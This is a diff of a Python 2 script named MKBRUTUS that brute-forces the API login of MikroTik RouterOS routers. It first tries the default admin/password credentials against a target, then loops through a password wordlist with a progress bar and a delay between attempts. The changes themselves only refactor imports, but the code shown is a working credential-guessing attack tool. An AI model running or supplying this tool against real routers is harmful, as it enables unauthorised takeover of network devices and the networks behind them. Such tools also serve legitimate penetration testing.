@@ -28,12 +28,11 @@
 """
 
 from docopt import docopt
-import time
-import sys
+from time import sleep
+from sys import exit
 import codecs
-import pyprind
-import routeros_api
-from routeros_api import exceptions
+from pyprind import ProgBar
+from routeros_api import connect, exceptions
 
 
 def main(args):
@@ -42,7 +41,7 @@ def main(args):
     success = False
 
     try:
-        routeros_api.connect(
+        connect(
             args['<TARGET>'],
             'admin',
             'password'
@@ -60,7 +59,7 @@ def main(args):
     else:
         alert = "[-] Default RouterOS credentials were unsuccessful."
         print alert
-        time.sleep(1)
+        sleep(1)
 
         msg = "[-] Starting bruteforce attack. "
         msg += "Trying with passwords in list...\n"
@@ -75,7 +74,7 @@ def main(args):
         psswd_count = dict_file.read().count('\n')
         dict_file.seek(0)
         items = 0
-        progress_bar = pyprind.ProgBar(
+        progress_bar = ProgBar(
             psswd_count,
             stream=1,
             title='MKBRUTUS Bruteforce Attack'
@@ -90,7 +89,7 @@ def main(args):
                 print alert + " - current: " + password
 
             try:
-                routeros_api.connect(
+                connect(
                     args['<TARGET>'],
                     args['--user'],
                     password
@@ -108,7 +107,7 @@ def main(args):
 
             if not args['--verbose']:
                 progress_bar.update()
-            time.sleep(int(args['--seconds']))
+            sleep(int(args['--seconds']))
 
         dict_file.close()
 
@@ -123,4 +122,4 @@ if __name__ == '__main__':
         main(args)
     except KeyboardInterrupt:
         print '\nAborted by user. Exiting... '
-        sys.exit(0)
+        exit(0)
